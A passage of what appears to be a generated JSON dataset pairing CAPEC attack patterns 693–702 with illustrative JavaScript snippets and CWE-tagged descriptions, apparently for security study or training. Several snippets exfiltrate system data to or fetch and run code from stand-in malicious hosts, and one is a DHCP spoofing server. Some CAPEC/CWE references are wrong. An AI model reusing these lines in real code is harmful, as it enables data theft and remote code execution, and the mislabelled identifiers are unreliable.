        "description": "This JavaScript code snippet demonstrates a scenario where an adversary spoofs commit metadata in a Git repository to deceive users. The code downloads commit metadata from a potentially malicious source without verifying its integrity (CWE-494). It then writes this metadata to the Git repository's commit message file, potentially exposing the repository to unauthorized control (CWE-527). Additionally, the code includes sensitive information directly in the source code (CWE-540), which should generally be avoided. This snippet embodies the main idea of CAPEC-463 by showing how an attacker can manipulate version control metadata to mislead users about the origin and maintenance of the software."
    },
    {
        "capec_id": "693",
        "capec_name": "StarJacking",
        "code_snippet": "const https = require('https');\nconst fs = require('fs');\n\n// URL of the package to download\nconst packageUrl = 'https://example.com/malicious-package.tar.gz';\nconst packagePath = './malicious-package.tar.gz';\n\n// Download the package without integrity check\nhttps.get(packageUrl, (response) => {\n  const file = fs.createWriteStream(packagePath);\n  response.pipe(file);\n  file.on('finish', () => {\n    file.close();\n    console.log('Downloaded malicious package without integrity check.');\n    // Execute the downloaded package\n    const exec = require('child_process').exec;\n    exec(`tar -xzf ${packagePath} -C ./`, (err, stdout, stderr) => {\n      if (err) {\n        console.error(`Execution error: ${err}`);\n        return;\n      }\n      console.log(`Package executed: ${stdout}`);\n    });\n  });\n}).on('error', (err) => {\n  console.error(`Download error: ${err.message}`);\n});",
        "description": "This JavaScript code snippet demonstrates a scenario where a package is downloaded and executed without performing any integrity checks, embodying the concept of 'StarJacking'. The code fetches a package from a specified URL and saves it locally. It then executes the downloaded package without verifying its origin or integrity, which could lead to the execution of malicious code. This example highlights several related CWEs: CWE-494 (Download of Code Without Integrity Check), CWE-506 (Embedded Malicious Code), and CWE-348 (Use of Less Trusted Source). The code represents the risk of trusting and executing code from a potentially malicious source, which is a core idea of the 'StarJacking' attack pattern."
    },
    {
        "capec_id": "694",
        "capec_name": "System Location Discovery",
        "code_snippet": "const getLocationInfo = () => {\n  const locationInfo = {\n    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,\n    language: navigator.language,\n    keyboardLayout: navigator.keyboard ? navigator.keyboard.getLayoutMap() : 'unknown'\n  };\n  return locationInfo;\n};\n\nconst sendLocationInfo = async () => {\n  const locationInfo = getLocationInfo();\n  try {\n    await fetch('https://malicious.example.com/collect', {\n      method: 'POST',\n      headers: {\n        'Content-Type': 'application/json'\n      },\n      body: JSON.stringify(locationInfo)\n    });\n  } catch (error) {\n    console.error('Error sending location info:', error);\n  }\n};\n\nsendLocationInfo();",
        "description": "This JavaScript code snippet demonstrates how an adversary might collect and send sensitive system information, such as timezone, language, and keyboard layout, to a remote server. The `getLocationInfo` function gathers this information, and the `sendLocationInfo` function sends it to a specified URL. This embodies the CAPEC of 'System Location Discovery' by collecting geographical and system-specific information. The code also touches on related CWEs, such as the exposure of sensitive system information (CWE-497) and the potential for incorrect data forwarding (CWE-1422) if the information is mishandled or intercepted."
    },
    {
        "capec_id": "695",
        "capec_name": "Repo Jacking",
        "code_snippet": "const https = require('https');\nconst fs = require('fs');\n\n// Vulnerable function to download and execute code from a remote repository\nfunction downloadAndExecute(url) {\n  https.get(url, (res) => {\n    let data = '';\n\n    // A chunk of data has been received.\n    res.on('data', (chunk) => {\n      data += chunk;\n    });\n\n    // The whole response has been received.\n    res.on('end', () => {\n      // Save the downloaded code to a file\n      fs.writeFileSync('downloadedCode.js', data);\n\n      // Execute the downloaded code without integrity check\n      require('./downloadedCode.js');\n    });\n  }).on('error', (err) => {\n    console.error('Error downloading the code:', err.message);\n  });\n}\n\n// Example usage\nconst repoUrl = 'https://example.com/maliciousCode.js';\ndownloadAndExecute(repoUrl);",
        "description": "This JavaScript code snippet demonstrates a vulnerable function that downloads and executes code from a remote repository without performing any integrity checks. The function `downloadAndExecute` takes a URL as an argument, downloads the code from that URL, saves it to a file, and then executes it using `require`. This embodies the main idea of 'Repo Jacking' (CAPEC-494) by showing how an adversary could exploit the redirect property of VCS repositories to trick users into incorporating malicious code. The code also touches on related CWEs such as 'Download of Code Without Integrity Check' (CWE-494) and 'Inclusion of Functionality from Untrusted Control Sphere' (CWE-829)."
    },
    {
        "capec_id": "696",
        "capec_name": "Load Value Injection",
        "code_snippet": "function vulnerableFunction(input) {\n  let buffer = new ArrayBuffer(64);\n  let view = new DataView(buffer);\n  let secret = 'SensitiveData';\n\n  // Simulate a page fault or microcode assist\n  try {\n    // This line simulates a transient load that could be influenced by an attacker\n    let transientData = view.getUint32(input, true);\n    // Use the transient data in a way that could expose sensitive information\n    if (transientData === 0xdeadbeef) {\n      console.log('Secret:', secret);\n    }\n  } catch (e) {\n    // Handle the fault\n    console.error('Page fault or microcode assist occurred');\n  }\n}\n\n// Simulate an attacker influencing the input to cause a transient execution\nvulnerableFunction(0xdeadbeef);",
        "description": "This JavaScript code snippet demonstrates a simplified version of a Load Value Injection (LVI) attack. The function `vulnerableFunction` simulates a scenario where an attacker can influence the input to cause a transient execution that operates on adversary-controlled data. The `ArrayBuffer` and `DataView` are used to simulate microarchitectural buffers. The code attempts to read from the buffer using an input that could be influenced by an attacker, potentially causing a page fault or microcode assist. If the transient data matches a specific value (0xdeadbeef), it prints out a secret value, simulating the exposure of sensitive information. This example embodies the main idea of CAPEC-1342, CAPEC-1423, CAPEC-1422, and CAPEC-1421 by demonstrating how transient execution can be manipulated to expose sensitive data."
    },
    {
        "capec_id": "697",
        "capec_name": "DHCP Spoofing",
        "code_snippet": "const dgram = require('dgram');\nconst server = dgram.createSocket('udp4');\n\nserver.on('message', (msg, rinfo) => {\n  const message = msg.toString();\n  if (message.includes('DHCPDISCOVER')) {\n    const spoofedOffer = Buffer.from('DHCPOFFER');\n    server.send(spoofedOffer, 0, spoofedOffer.length, rinfo.port, rinfo.address, (err) => {\n      if (err) console.error('Error sending spoofed offer:', err);\n    });\n  }\n});\n\nserver.bind(67, () => {\n  console.log('DHCP spoofing server listening on port 67');\n});",
        "description": "This JavaScript code snippet demonstrates a basic DHCP spoofing attack using the 'dgram' module to create a UDP server. The server listens for incoming DHCPDISCOVER messages on port 67. When such a message is received, it responds with a spoofed DHCPOFFER message. This embodies the main idea of CAPEC-139 (DHCP Spoofing) by masquerading as a legitimate DHCP server. The code also touches on related CWEs: it does not ensure communication with the correct endpoint (CWE-923), relies on IP address for authentication (CWE-291), and could be subject to capture-replay attacks (CWE-294)."
    },
    {
        "capec_id": "698",
        "capec_name": "Install Malicious Extension",
        "code_snippet": "function installMaliciousExtension() {\n  const script = document.createElement('script');\n  script.src = 'http://malicious-site.com/malicious-code.js';\n  document.head.appendChild(script);\n}\n\nfunction trickUser() {\n  if (confirm('Install this cool new extension?')) {\n    installMaliciousExtension();\n  }\n}\n\ntrickUser();",
        "description": "This JavaScript code snippet demonstrates the concept of 'Install Malicious Extension' by tricking the user into installing a malicious extension. The 'installMaliciousExtension' function creates a script element that points to a malicious external source (CWE-494: Download of Code Without Integrity Check) and appends it to the document head, effectively executing the malicious code. The 'trickUser' function uses a simple confirmation dialog to deceive the user into approving the installation (CWE-507: Trojan Horse). This code snippet embodies the main idea of the CAPEC by showing how an adversary can trick a user into installing a malicious extension, leveraging the related weaknesses."
    },
    {
        "capec_id": "699",
        "capec_name": "Eavesdropping on a Monitor",
        "code_snippet": "const sensitiveData = 'This is sensitive information';\n\n// Simulate cleartext transmission of sensitive data\nfunction transmitData(data) {\n  console.log('Transmitting data:', data); // CWE-319: Cleartext Transmission of Sensitive Information\n}\n\n// Simulate improper protection of physical side channels\nfunction emitElectromagneticSignal(data) {\n  // This function represents the emission of electromagnetic signals that can be captured\n  console.log('Emitting electromagnetic signal for data:', data); // CWE-1300: Improper Protection of Physical Side Channels\n}\n\n// Simulate covert storage channel\nfunction covertStorageChannel(data) {\n  let covertChannel = [];\n  for (let i = 0; i < data.length; i++) {\n    covertChannel.push(data.charCodeAt(i)); // CWE-515: Covert Storage Channel\n  }\n  console.log('Covert storage channel data:', covertChannel);\n}\n\n// Simulate improper management of sensitive trace data\nfunction storeTraceData(data) {\n  let traceData = data.split('').map(char => char.charCodeAt(0));\n  console.log('Storing trace data:', traceData); // CWE-1323: Improper Management of Sensitive Trace Data\n}\n\n// Main function to demonstrate the vulnerabilities\nfunction main() {\n  transmitData(sensitiveData);\n  emitElectromagneticSignal(sensitiveData);\n  covertStorageChannel(sensitiveData);\n  storeTraceData(sensitiveData);\n}\n\nmain();",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to the CAPEC 'Eavesdropping on a Monitor'. The 'transmitData' function simulates the cleartext transmission of sensitive information (CWE-319). The 'emitElectromagneticSignal' function represents the emission of electromagnetic signals that can be captured by an adversary (CWE-1300). The 'covertStorageChannel' function simulates the use of a covert storage channel to transfer information (CWE-515). The 'storeTraceData' function demonstrates improper management of sensitive trace data (CWE-1323). Together, these functions illustrate how sensitive information can be exposed through various side channels, aligning with the main idea of the CAPEC."
    },
    {
        "capec_id": "700",
        "capec_name": "Network Boundary Bridging",
        "code_snippet": "const net = require('net');\n\nconst trustedNetwork = '192.168.1.0/24';\nconst untrustedNetwork = '10.0.0.0/24';\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // Improper Restriction of Communication Channel to Intended Endpoints (CWE-923)\n    if (isTrustedEndpoint(socket.remoteAddress)) {\n      // Trust Boundary Violation (CWE-501)\n      processData(data);\n    } else {\n      console.log('Untrusted endpoint detected:', socket.remoteAddress);\n    }\n  });\n});\n\nserver.listen(8080, '0.0.0.0');\n\nfunction isTrustedEndpoint(ip) {\n  // Simplified check for trusted network\n  return ip.startsWith('192.168.1.');\n}\n\nfunction processData(data) {\n  // Improper Enforcement of Message Integrity During Transmission (CWE-924)\n  if (verifyMessageIntegrity(data)) {\n    console.log('Processing data:', data.toString());\n  } else {\n    console.log('Message integrity check failed.');\n  }\n}\n\nfunction verifyMessageIntegrity(data) {\n  // Simplified integrity check\n  return data.length > 0;\n}",
        "description": "This JavaScript code snippet creates a TCP server that listens for incoming connections. It demonstrates several vulnerabilities related to the CAPEC 'Network Boundary Bridging'. The server accepts connections from any IP address and processes data from endpoints it considers 'trusted' based on a simple IP address check (CWE-923 and CWE-501). The code does not properly enforce message integrity during transmission (CWE-924), as it uses a very basic check that does not ensure the message has not been tampered with. This setup can allow an adversary to bridge trusted and untrusted networks by exploiting these weaknesses, thereby crossing network boundaries."
    },
    {
        "capec_id": "701",
        "capec_name": "Browser in the Middle (BiTM)",
        "code_snippet": "const remoteDesktopUrl = 'http://malicious-server.com/remote-desktop';\n\nfunction loadRemoteDesktop() {\n    const iframe = document.createElement('iframe');\n    iframe.src = remoteDesktopUrl;\n    iframe.style.width = '100%';\n    iframe.style.height = '100%';\n    document.body.appendChild(iframe);\n}\n\nwindow.onload = function() {\n    loadRemoteDesktop();\n};",
        "description": "This JavaScript code snippet demonstrates a Browser in the Middle (BiTM) attack. When the victim loads the webpage, an iframe is created and appended to the document body, loading a remote desktop session from a malicious server. This attack leverages CWE-830 (Inclusion of Web Functionality from an Untrusted Source) by embedding an iframe from an untrusted domain, potentially giving the attacker control over the victim's browser session. The code does not verify the authenticity of the remote desktop source (CWE-345), and it relies on the client-side to enforce security (CWE-602), making it vulnerable to exploitation."
    },
    {
        "capec_id": "702",
        "capec_name": "Exploiting Incorrect Chaining or Granularity of Hardware Debug Components",
        "code_snippet": "class DebugComponent {\n  constructor() {\n    this.debugFunctions = {\n      readRegister: this.readRegister,\n      writeRegister: this.writeRegister,\n      injectError: this.injectError\n    };\n    this.authorized = false; // Incorrectly assuming authorization for all functions\n  }\n\n  authorize(user) {\n    if (user === 'admin') {\n      this.authorized = true;\n    }\n  }\n\n  readRegister() {\n    if (this.authorized) {\n      console.log('Reading register...');\n    } else {\n      console.log('Unauthorized access attempt to read register');\n    }\n  }\n\n  writeRegister() {\n    if (this.authorized) {\n      console.log('Writing to register...');\n    } else {\n      console.log('Unauthorized access attempt to write register');\n    }\n  }\n\n  injectError() {\n    if (this.authorized) {\n      console.log('Injecting error...');\n    } else {\n      console.log('Unauthorized access attempt to inject error');\n    }\n  }\n}\n\nconst debugComponent = new DebugComponent();\ndebugComponent.authorize('admin'); // Authorizes all functions at once\n\ndebugComponent.readRegister(); // Authorized\n\ndebugComponent.writeRegister(); // Authorized\n\ndebugComponent.injectError(); // Authorized\n",
        "description": "This JavaScript code snippet defines a `DebugComponent` class that simulates a hardware debug component with multiple functions: `readRegister`, `writeRegister`, and `injectError`. The class has an `authorize` method that grants access to all debug functions if the user is 'admin'. This represents the CAPEC's main idea of incorrect chaining or granularity of hardware debug components, where authorization is assumed for a group of functions rather than being checked individually. The code demonstrates how an adversary could exploit this by gaining unauthorized access to critical debug functionalities, such as injecting errors, which aligns with the related CWEs."
    }
]